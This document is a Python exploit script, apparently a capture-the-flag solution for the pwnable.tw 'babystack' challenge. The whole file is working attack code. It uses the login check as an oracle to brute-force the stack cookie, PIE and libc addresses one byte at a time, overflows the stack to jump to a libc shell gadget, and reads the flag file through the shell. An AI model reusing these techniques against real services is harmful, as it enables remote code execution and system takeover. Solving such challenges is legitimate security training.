#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from haxy import *
import struct

exe = context.binary = ELF('././babystack')

host = args.HOST or 'chall.pwnable.tw'
port = int(args.PORT or 10205)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

# -- Exploit goes here --

def login(password=0xdeadbeef):
    io.recv(timeout=0.5)
    s("1")
    if b"Your passowrd :" in re():
        s(password)
        if b"Login Success !" in rl():
            log.info("logged in!")
            return 1
        else:
            log.info("wrong password")
            return 0
    else:
        if password != 0xdeadbeef:
            login(password)
        else:
            log.info("logged out")
            return 0

def vuln(buf):
    sa(">> ", "3")
    if b"Copy :" in re():
        s(buf)

def brute_cookie():
    j=0
    cookie = ""
    log_level = context.log_level
    p = log.progress(f"")
    while j<= 0x10:
        p.status(f"bruteforcing cookie : {hex(j)}/0x10")
        for oracle_byte in range(0x1, 0xff+1):
            context.log_level = 'error'
            if login(cookie + chr(oracle_byte) + "\x00"):
                cookie += chr(oracle_byte)
                j=j+1
                break
        context.log_level = log_level
    p.success("cookie bruteforced 🍺")
    return cookie

def brute_LIBC():
    j=0
    LIBC = ""
    log_level = context.log_level
    p = log.progress(f"")
    while j < 0x6:
        p.status(f"bruteforcing LIBC : {hex(j)}/0x6")
        for oracle_byte in range(0x1, 0xff+1):
            context.log_level = 'error'
            if login(cookie + "agaaaaa" + LIBC + chr(oracle_byte) + "\x00"):
                LIBC += chr(oracle_byte)
                j=j+1
                break
        context.log_level = log_level
    p.success("LIBC bruteforced 🍺")
    return LIBC

def brute_PIE():
    j=0
    PIE = ""
    log_level = context.log_level
    p = log.progress(f"")
    while j < 0x6:
        p.status(f"bruteforcing PIE : {hex(j)}/0x6")
        for oracle_byte in range(0x1, 0xff+1):
            sla(">> ", "1"*15)
            sa("Your passowrd :", cookie + "1"*14 + "\n" + PIE + chr(oracle_byte) + "\x00")
            context.log_level = 'error'
            if b"Login Success !" in rl():
                PIE += chr(oracle_byte)
                j=j+1
                sla(">> ", "1"*15)
                break
        context.log_level = log_level
    p.success("PIE bruteforced 🍺")
    return PIE

libc = ELF(exe.libc.path)
io = start()
cookie=brute_cookie()
sla(">> ", "1"*15) # logout
pie_leak = brute_PIE()
exe.address = u64(pie_leak+"\x00\x00")-0x1060
log.info(f"PIE base : {hex(exe.address)}")
# state logged out
sa(">> ", "1")
sa("Your passowrd :", "\x00" + cookie + "1"*15 + "aaaaaaaabaaaaaaacaaaaaaadaaaaaa" + cookie + "agaaaaaa")
vuln("X"*63)
#got libc address on place
sa(">> ", "1")
libc_leak = brute_LIBC()
libc.address = u64(libc_leak+"\x00\x00")-0x6ff61
log.info(f"libc base : {hex(libc.address)}")

sa(">> ", "1")
sa(">> ", "1")
sa("Your passowrd :", b"\x00" + b"a"*63 + bytes(cookie, "latin1") + b"a"*23 + p64(libc.address + 0x45216) + b"\x00" + b"xxxx" + b"s"*9)
vuln("X"*(8*1))
sa(">> ", "2")
sl("cat /home/babystack/flag")
io.interactive()

